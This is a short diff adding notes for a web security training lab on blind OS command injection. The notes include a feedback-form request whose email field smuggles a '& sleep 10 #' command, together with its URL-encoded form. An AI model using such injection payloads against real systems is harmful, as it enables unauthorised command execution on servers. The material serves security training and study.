@@ -1,0 +1,9 @@
+Lab #2: Blind OS command injection with time delays
+
+End goal:  exploit the blind OS command injection vulnerability to cause a 10 second delay.
+
+Analysis:
+
+csrf=oRjBrkWXwjIML6A5HZTw4JHZ0Cs7W8HO&name=ene&email=ene%40mail & sleep 10 #&subject=feedback&message=this+is+a+feedback
+
+ & sleep 10 # ==> +%26+sleep+10+%23
